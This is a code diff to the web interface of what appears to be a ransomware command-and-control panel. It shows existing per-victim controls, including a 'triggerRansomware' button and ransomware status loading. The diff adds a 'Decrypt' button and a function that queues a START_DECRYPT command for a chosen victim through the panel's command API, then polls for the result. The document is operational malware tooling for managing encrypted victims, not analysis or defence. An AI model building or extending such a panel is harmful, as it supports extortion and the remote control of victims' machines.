@@ -294,6 +294,15 @@
             overflow-y: auto;
             margin-top: 5px;
         }
+        
+        .btn-decrypt {
+            background: #2563eb;
+            color: #fff;
+        }
+        
+      .btn-decrypt:hover {
+            box-shadow: 0 0 20px rgba(37, 99, 235, 0.4);
+        }
 
         /* ============================================================
            LIVE STREAM
@@ -544,6 +553,13 @@
                 btnRansom.onclick = function(id){ return function(){ triggerRansomware(id); }; }(vid);
                 cmdBox.appendChild(btnRansom);
                 card.appendChild(cmdBox);
+                var btnDecrypt = document.createElement('button');
+                btnDecrypt.className = 'btn btn-decrypt'; // Add style for it
+                btnDecrypt.textContent = '🔓 Decrypt';
+                btnDecrypt.onclick = function(id){ return function(){ triggerDecrypt(id); }; }(vid);
+                cmdBox.appendChild(btnDecrypt);
+                
+      
 
                 // Result area (for command output)
                 var result = document.createElement('div');
@@ -797,6 +813,37 @@
                 panel.innerHTML = '❌ Error loading ransomware status';
             });
         }
+        
+        
+        function triggerDecrypt(victimId) {
+    if (!confirm('⚠️ Start decryption on ' + victimId + '? This will restore encrypted files.')) return;
+    const resultDiv = document.getElementById(`result_${victimId}`);
+    resultDiv.textContent = '🔓 Sending START_DECRYPT...';
+    resultDiv.className = 'result visible pending';
+    addLiveEntry('decrypt', `🔓 Decryption triggered on ${victimId}`);
+
+    fetch('/api/send_command', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({victim_id: victimId, command: 'START_DECRYPT'})
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.status === 'queued') {
+            resultDiv.textContent = '✅ Decrypt command sent! Waiting for execution...';
+            resultDiv.className = 'result visible success';
+            setTimeout(() => checkResult(victimId, data.command_id), 10000);
+            setTimeout(() => loadRansomwareStatus(victimId), 15000);
+        } else {
+            resultDiv.textContent = '❌ Error: ' + (data.message || 'Unknown');
+            resultDiv.className = 'result visible error';
+        }
+    })
+    .catch(e => {
+        resultDiv.textContent = '❌ Error: ' + e.message;
+        resultDiv.className = 'result visible error';
+    });
+}
 
         // ================================================================
         //  AUTO REFRESH (no manual button)
